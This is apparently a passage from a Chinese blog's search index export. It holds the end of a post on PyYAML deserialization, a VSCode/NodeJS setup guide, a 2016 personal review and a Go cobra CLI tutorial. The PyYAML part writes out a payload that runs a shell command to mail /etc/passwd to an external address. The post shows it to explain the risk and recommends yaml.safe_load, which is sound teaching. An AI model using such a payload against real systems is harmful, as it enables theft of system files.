序列化-pyYAML作为一个流行的配置文件格式，YAML不一定被认为是一个能够诱使反序列化器执行任意代码的强大的序列化协议。让它甚至更危险的是，事实上Python的YAML默认实现—-PyYAML让反序列化看起来非常无辜：1234567&gt;&gt;&gt; dangerous_input = """... some_option: !!python/object/apply:subprocess.call... args: [cat /etc/passwd | mail 719118794@qq.com]... kwds: &#123;shell: true&#125;... """&gt;&gt;&gt; yaml.load(dangerous_input)&#123;'some_option': 0&#125; 而/etc/passwd已经被窃取了。一个建议的解决方法是总是使用 yaml.safe_load来处理那些你不信任的YAML序列化。尽管如此，目前的PyYAML默认感觉有些驱使人考虑其他倾向于为相似的目的使用 dump/ load函数名（但是以一种安全的方式的序列化库]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用VSCode快速搭建NodeJS开发环境]]></title>
      <url>%2F2017%2F01%2F01%2Fnodejs-vscode%2F</url>
      <content type="text"><![CDATA[文本的目的是快速搭建NodeJS的开发环境，NodeJS的常见的开发方式有2种，一种是编辑器，一种是IDE。编辑器推荐使用微软出品的vscdoe，因为其启动速度快，轻量级，执行简单，调试方便，还有界面漂亮。而IDE 无可厚非的就是WebStorm了。这里使用vscdoe搭建开发环境，因为IDE真的比较耗内存。除非开发大型项目,否则轻易我不开IDE。 VSCode简介VSCode全称是Visual Studio Code, 由微软出品,但它不是那个大块头的Visual Studio ,它是一个精简版的迷你Visual Studio，并且，Visual Studio Code可以跨！平！台！Windows、Mac和Linux通用。 安装VSCode可以通过官方下载, 由于你我都懂的原因，可能无法访问，因此你可能会需要使用国内镜像,直接下mac版本的安装包，安装。 运行在VS Code中，我们可以非常方便地运行JavaScript文件。 VS Code以文件夹作为工程目录（Workspace Dir），所有的JavaScript文件都存放在该目录下。此外，VS Code在工程目录下还需要一个.vscode的配置目录，里面存放里VS Code需要的配置文件。 假设我们要创建一个hello的工程，因此我需要一个hello的目录作为工程目录，然后在里面编写hello.js文件，则该工程目录的结构如下：1234567hello/ &lt;-- workspace dir|+- hello.js &lt;-- JavaScript file|+- .vscode/ &lt;-- VS Code config | +- launch.json &lt;-- VS Code config file for JavaScript 然后切换到debug模式进行运行，关于debug模式后面介绍。对于更细节相关的文档可以参考微软官方提供的JavaScript in VS Code 智能提示因为之前微软推出了typescript语言，结合tsd文件，用visual studio写typescript代码是相当爽的，智能提示的功能非常nb。 这个功能理所应当也被vscode继承了，但是现在tsd项目已经过期了，接过这个接力棒的是typings 因此我们将通过Typings来实现JavaScript智能提示功 注意事项 安装NPM NPM是和Node.js一起安装的，如果你想使用NPM的话，那么你应该先安装Node.js Typings vs TSD Typings作为TSD的替代者而出现的，如果你已经安装了TSD，那么需要知道现在TSD已经不推荐使用了。如果已经安装TSD请执行下面的命令来移除它1npm rm -g tsd CNPM 在国内由于墙的原因，大部分时候使用NPM安装模块的速度上会很慢，这时候我们其实可以选择国内淘宝的NPM镜像，关于淘宝NPM镜像的使用方法可以参考淘宝 NPM 镜像 使用下面的命令来进行安装和使用12npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install koa 安装Typings我们通过cnpm来安装typings1234maojun@maojun-mbp$ npm install -g typingsmaojun@maojun-mbp$ typings -v2.0.0 配置智能提示安装完成后，我们需要安装相应的需要提示功能库或者框架的类型信息文件，在这里我们新建一个文件夹 NodeSnippet，为了了解Typings的使用方法，你可能需要简单看看typings github 使用命令行进入到该目录中，分别输入下面两个命令来安装Node和Lodash的类型接口信息文件：12typings install dt~node --global --savetypings install lodash --save 这时候我们可以看到我们的 NodeSnippet目录中多了一些文件：12345678910111213 maojun@maojun-mbp$ tree ..├── typings│ ├── globals│ │ └── node│ │ ├── index.d.ts│ │ └── typings.json│ ├── index.d.ts│ └── modules│ └── lodash│ ├── index.d.ts│ └── typings.json└── typings.json 这些文件就是为我们提供提示信息的类型类型文件(使用TypeScript定义)。查看Typings是否支持某个库或框架的智能提示，我们可以使用下面的命令:1typings search exampleName 启动智能提示配置好了类型接口后，可以通过两种方式来启动提示功能： 文件头加注释 1/// &lt;reference path="./typings/index.d.ts" /&gt; 在目录(在这里是NodeSnippet文件夹中)增加一个名为jsconfig.json的空文件 更多jsconfig.json文件的内容可以参考： JavaScript in VS Code 这样我们写代码的时候就有智能提示功能了， 效果如下: 调试如何调试写好了的JS程序喃？ 用VS Code快速创建launch.json文件, 主要是修改program这个参数，指明你 可执行文件位置。 关于Debug的细节，请参考Debugging 123456789101112131415161718192021&#123; // Use IntelliSense to learn about possible Node.js debug attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "启动程序", "program": "$&#123;workspaceRoot&#125;/app.js", "cwd": "$&#123;workspaceRoot&#125;" &#125;, &#123; "type": "node", "request": "attach", "name": "附加到进程", "port": 5858 &#125; ]&#125; 效果如下:]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[2016总结与2017计划]]></title>
      <url>%2F2016%2F12%2F31%2F2016-summary%2F</url>
      <content type="text"><![CDATA[孔子曰:”吾日三省吾身”, 平时很少会静下心来反省和总结一段时间的功与过, 2016马上就要过去了，在这一年将要结束之时, 还是想回过一下这一年来的得与失, 顺便安排下来年的计划。 记录下这一年来自己的变化, 同时也为来年再战作准备, 而且我这人记性不好, 留个底,照亮自己需要走的路。 转瞬即逝的20162016是繁忙的一年，工作上处处充满挑战，有些挑战是自己喜欢的，有些挑战也是自己比较抵触的，我喜欢开发，从运维开发转而参与大型系统开发，这的确是一个不小的挑战，我是一个对技术有点激情的人，因此这个挑战对我而言还是比较喜欢的。后来同时做起了产品设计, 每天扣脑袋, 看别人的产品，画产品设计图， 这些在当时的我是很抵触的, 当时我还处于单纯的想积累技术的阶段。现在看来这段经历也是我宝贵的财富, 毕竟产品决定东西的价值，用再牛叉的技术,做一个没有价值的东西, 这是一件愚蠢的行为，我这里说的价值是长远价值，而不是当下看起来有价值, 这个说起来很悬，以后有机会深入讨论这个。 2016这一年也在和JumpServer一同成长的一年，感触也蛮多的，首先是技术的成长，一个开源产品的技术的迭代，我们致力于设计NB的产品和写出漂亮的代码。其次为有可能的融资谈判而兴奋过，然而最后还是平静下来, 慢慢做一个自己认可的能力范围之内的产品。 工作上的事儿, 总是有那么点紧绷, 其实生活上也有很多值得高兴的事儿，我们有了自己的房子，并且搬进去了，告别了租房的日子，这一切多谢我的老婆打理，我基本是啥心都没操过。其次，我女儿和我关系也很不错，虽然她生气的时候只找她妈妈，但是我在她心中的地位也仅次于她妈妈，我也心有愧疚，作为一个父亲我陪伴她的时候是有点少了。还有我的好搭档，在我最需要钱的时候, 一身不吭的直接转我支付宝上,人生中能交到一个这样的朋友，是我的莫大的荣幸。 还有一个事儿，我终于用上Mac了，虽然是一个二手的MBP，但是这对满足一个屌丝的虚荣心完全受用了, 说岔了, 我再也不用在Windows上装Ubuntu开发了。 瞬息万变的2017变化和革新是很快的, 比如OpenStack没有那么热了, 容器技术也基本成了开发的必备技能, 无论你作为一个前端开发还是后端开发JavaScript都快成为一门必备语言了。前后端的完全分离也愈演愈烈, 各种前段框架的变化。伴随而来的是微服务+容器技术的紧密结合。在最后DDD也随着微服务的出现，对开发人员提出了更高的需求, 以后那种只会写代码的人将愈来愈少了。 我Hold不住这些，因此在技术方面我仅能列出我需要提升的书单: Python提升书单(今年主力) 基础回过 廖雪峰官网 Think Python 2ed 中译版精校 PDF 电子书 进阶深 python3-cookbook 电子书Python高手之路 常见的一些代码实现 python实例手册 网站上的文章 设计模式 快速版大话设计模式 一些最新的例子 精通Python设计模式 数据结构与算法 快速阅读总结 电子书：Data Structures and Algorithms with Python-2015 源码阅读 Django Class Based View Flask 源码阅读 Openstack KeyStone 源码阅读 理解Python解释器 用Python实现一个Python解释器 Golang提升书单 回过基础： Go Web 编程 Go入门指南 JavaScript提升书单 回过基础： 廖雪峰官网 阮一峰的javascript教程 ECMAScript 6 入门 除了技术, 还应该有生活。而生活就是: 赶紧把账还完]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何使用golang编写漂亮的命令行工具]]></title>
      <url>%2F2016%2F12%2F30%2Fgo-cobra%2F</url>
      <content type="text"><![CDATA[无论是Openstack还是Docker都有一个漂亮的命令行工具，Openstack的命令行工具主要使用的是Python的argparse库，至于Docker的CLI的实现还没看，但是今天看到了一个在Golang中 用于构建像Docker命令行风格的一个库:cobra cobra简介Cobra既是一个用来创建强大的现代CLI命令行的golang库，也是一个生成程序应用和命令行文件的程序。它提供的功能有： 简易的子命令行模式，如 app server， app fetch等等 完全兼容posix命令行模式 嵌套子命令subcommand 支持全局，局部，串联flags 使用Cobra很容易的生成应用程序和命令，使用cobra create appname和cobra add cmdname 如果命令输入错误，将提供智能建议，如 app srver，将提示srver没有，是否是app server 自动生成commands和flags的帮助信息 自动生成详细的help信息，如app help 自动识别-h，–help帮助flag 自动生成应用程序在bash下命令自动完成功能 自动生成应用程序的man手册 命令行别名 自定义help和usage信息 可选的紧密集成的viper apps 从功能上看完全超越了argparse， 下面将做一个简单的测试，体验下cobra的强大 安装安装cobra需要翻墙，我的环境是Mac，使用ss + polipo来提供https的方向代理。我的代理端口在8123,所以命令行是这样的1$https_proxy=localhost:8123 go get -v github.com/spf13/cobra/cobra 安装完成后可以看到cobra的一些帮助信息1234567891011121314151617181920maojun@maojun-mbp$ cobra -hCobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: cobra [command]Available Commands: add Add a command to a Cobra Application init Initialize a Cobra ApplicationFlags: -a, --author string Author name for copyright attribution (default "YOUR NAME") --config string config file (default is $HOME/.cobra.yaml) -l, --license license Name of license for the project (can provide license in config) -b, --projectbase string base project directory, e.g. github.com/spf13/ --viper Use Viper for configuration (default true)Use "cobra [command] --help" for more information about a command. 使用接下来将使用cobra构建一个不带子命令的CLI和带子命令的CLI 初始化我们可以通过cobra提供的init命令来生成CLI的框架代码，因此切换到GOPATH/src下面,初始CLI框架12345maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]` 这个命令会帮你生成这样一个框架代码123456 maojun@maojun-mbp$ tree demodemo├── LICENSE├── cmd│ └── root.go└── main.go 简单的CLI在写一些简单的CLI的时候我们其实是不需要有子命令的，我们往往需要这样一种简单的CLI12345678910demo.exeDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -h, --help help for demo -n, --name string person's name 接下来我们就在上面生成的代码的基础上完成一个不带子命令的CLI。首先，我需要编写我的业务逻辑，因此我在demo下面新建一个包，名称为simple。如下：123456789maojun@maojun-mbp$ tree ..├── LICENSE├── cmd│ └── root.go├── main.go└── simple ├── simple.go └── simple_test.go 这里仅仅实现一个print作为样例,因此simple.go是这样实现的123456789package simpleimport ( "fmt")func Show(name string, age int) &#123; fmt.Printf("My name is %s, my age is %d\n", name, age)&#125; 接下来我们需要将我们实行的整个Show方法暴露给CLI, 我们从生成的main文件入手分析。 在main里面调用了 demo/cmd包里面暴露的Execute 函数 [cmd.Execute()] 在demo/cmd/root.go中发现Execute执行的是RootCmd.Execute() 而RootCmd是一个cobra的Command结构体[RootCmd = &amp;cobra.Command]显然我们想要实行不带子命令的CLI，只需要将RootCmd的修改成我们需要的结构体就ok了 这里做了几点修改 RootCmd中的Command结构体中的Run方法需要我们定义， 主要功能就是调用simple里面的Show接口 cmd包初始化得时候需要通过RootCmd.Flags()获取命令行传入的name和age的参数，因此这里需要修改init方法 最后我们不需要从配置文件读取配置，注释掉：nitConfig函数和”github.com/spf13/viper” 最终这个root.go是这样的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "os" "demo/simple" "github.com/spf13/cobra" // "github.com/spf13/viper")//var cfgFile stringvar name stringvar age int// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "demo", Short: "A test demo", Long: `Demo is a test appcation for print things`,// Uncomment the following line if your bare application// has an action associated with it: Run: func(cmd *cobra.Command, args []string) &#123; if len(name) == 0 &#123; cmd.Help() return &#125; simple.Show(name, age) &#125;,&#125;// Execute adds all child commands to the root command sets flags appropriately.// This is called by main.main(). It only needs to happen once to the rootCmd.func Execute() &#123; if err := RootCmd.Execute(); err != nil &#123; fmt.Println(err) os.Exit(-1) &#125;&#125;func init() &#123; // cobra.OnInitialize(initConfig) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags, which, if defined here, // will be global for your application. // RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)") // Cobra also supports local flags, which will only run // when this action is called directly. // RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle") RootCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") RootCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125;// // initConfig reads in config file and ENV variables if set.// func initConfig() &#123;// if cfgFile != "" &#123; // enable ability to specify config file via flag// viper.SetConfigFile(cfgFile)// &#125;// viper.SetConfigName(".demo") // name of config file (without extension)// viper.AddConfigPath("$HOME") // adding home directory as first search path// viper.AutomaticEnv() // read in environment variables that match// // If a config file is found, read it in.// if err := viper.ReadInConfig(); err == nil &#123;// fmt.Println("Using config file:", viper.ConfigFileUsed())// &#125;// &#125; 最后测试下是不是我们想要的效果1234567891011maojun@maojun-mbp$ go run main.go -hDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -n, --name string persion's namemaojun@maojun-mbp$ go run main.go -n "test" -a 10My name is test, my age is 10 带子命令的CLI对于复杂的情况，往往需要带子命令场景，比如Docker的CLI，而最终的效果应该是这样的12345678910111213141516demoDemo is a test appcation for print thingsUsage: demo [flags] demo [command]Available Commands: test A brief description of your commandFlags: -a, --age int person's age -h, --help help for demo -n, --name string person's nameUse "demo [command] --help" for more information about a command. 支持子命令是cobra的自己的功能，因此直接可以通过cobra生成带子命令的代码12345678maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]`maojun@maojun-mbp$ cobra add testtest created at /Users/maojun/GoWorkDir/src/cmd/test.go 注释掉root.go那些不需要的地方, 然后修改生成的test.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "github.com/spf13/cobra")var name stringvar age int// testCmd represents the test commandvar testCmd = &amp;cobra.Command&#123; Use: "test", Short: "A brief description of your command", Long: `A longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, Run: func(cmd *cobra.Command, args []string) &#123; // TODO: Work your own magic here fmt.Printf("My name is %s, my age is %d\n", name, age) &#125;,&#125;func init() &#123; RootCmd.AddCommand(testCmd) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags which will work for this command // and all subcommands, e.g.: // testCmd.PersistentFlags().String("foo", "", "A help for foo") // Cobra supports local flags which will only run when this command // is called directly, e.g.: testCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") testCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125; 最后测试下是不是我们想要的效果 12345678910111213141516171819202122232425262728293031323334353637383940maojun@maojun-mbp$ go run main.go -hA longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo [command]Available Commands: test A brief description of your commandFlags: --config string config file (default is $HOME/.demo.yaml) -t, --toggle Help message for toggleUse "demo [command] --help" for more information about a command.maojun@maojun-mbp$ go run main.go test -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo test [flags]Flags: -a, --age int person's age -n, --name string persion's nameGlobal Flags: --config string config file (default is $HOME/.demo.yaml) maojun@maojun-mbp$ go run main.go test -a 10 -n testMy name is test, my age is 10 命令行补全，man这些可以自己手动测试]]></content>
    </entry>

    
  
  
</search>
